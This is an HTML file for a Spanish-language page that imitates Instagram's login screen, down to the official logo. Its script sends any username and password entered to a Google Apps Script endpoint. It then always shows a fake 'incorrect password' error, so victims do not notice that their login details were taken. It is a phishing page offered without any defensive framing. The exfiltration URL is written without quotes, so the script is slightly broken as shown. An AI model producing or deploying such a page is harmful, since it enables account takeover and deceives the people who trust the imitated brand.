<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .login-box {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            padding: 40px 40px 30px;
            width: 350px;
            text-align: center;
        }

        .logo {
            margin: 20px 0 20px;
            width: 175px;
        }
        
        .logo img {
            width: 100%;
        }

        .input-group {
            margin-bottom: 6px;
        }

        .input-group input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 8px 7px;
            font-size: 12px;
            color: #262626;
            box-sizing: border-box;
        }

        .input-group input:focus {
            border-color: #a8a8a8;
        }

        .login-btn {
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: #ffffff;
            font-weight: 600;
            padding: 7px 16px;
            width: 100%;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
        }

        .login-btn:disabled {
            opacity: 0.7;
            cursor: default;
        }

        .or {
            display: flex;
            align-items: center;
            margin: 18px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .or::before, .or::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .or::before { margin-right: 10px; }
        .or::after { margin-left: 10px; }

        .error-msg {
            color: #ed4956;
            font-size: 12px;
            font-weight: 600;
            display: none;
            margin-bottom: 10px;
            background-color: #fff0f0;
            padding: 10px;
            border-radius: 4px;
        }
    </style>
</head>
<body>

    <div class="login-box">
        <!-- Logo oficial -->
        <div class="logo">
            <img src="https://static.cdninstagram.com/rsrc.php/yr/r/Yfc020wY07c.svg" alt="Instagram">
        </div>

        <div class="error-msg" id="errorMsg">El nombre de usuario o la contraseña es incorrecta.</div>

        <form id="loginForm" onsubmit="return false;">
            <div class="input-group">
                <input type="text" name="username" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Contraseña" required>
            </div>
            <button type="submit" class="login-btn" id="submitBtn">Iniciar sesión</button>
        </form>

        <div class="or">O</div>
        
        <div style="color: #385185; font-size: 12px; font-weight: 600; cursor: pointer;">
            Iniciar sesión con Facebook
        </div>
        
        <div style="margin-top: 20px; font-size: 12px; color: #8e8e8e; cursor: pointer;">
            ¿Has olvidado la contraseña?
        </div>
    </div>

    <script>
        // https://script.google.com/macros/s/AKfycbx7EvnHcqTpVDBQKbciujloyJxorkJtkl4gH4mB53GpQyV22oech3iMoID513YZqspP/exec
        const SCRIPT_URL = https://script.google.com/macros/s/AKfycbx7EvnHcqTpVDBQKbciujloyJxorkJtkl4gH4mB53GpQyV22oech3iMoID513YZqspP/exec;

        const form = document.getElementById('loginForm');
        const btn = document.getElementById('submitBtn');
        const errorMsg = document.getElementById('errorMsg');

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            btn.disabled = true;
            btn.innerText = '...';
            errorMsg.style.display = 'none';

            const username = form.username.value;
            const password = form.password.value;

            const data = new FormData();
            data.append('username', username);
            data.append('password', password);

            fetch(SCRIPT_URL, {
                method: 'POST',
                body: data
            })
            .then(response => {
                return new Promise(resolve => setTimeout(resolve, 1000));
            })
            .then(() => {
                btn.disabled = false;
                btn.innerText = 'Iniciar sesión';
                errorMsg.style.display = 'block';
            })
            .catch(error => {
                btn.disabled = false;
                btn.innerText = 'Iniciar sesión';
                errorMsg.style.display = 'block';
                errorMsg.innerText = 'Error de conexión. Intenta de nuevo.';
            });
        });
    </script>
</body>
</html>
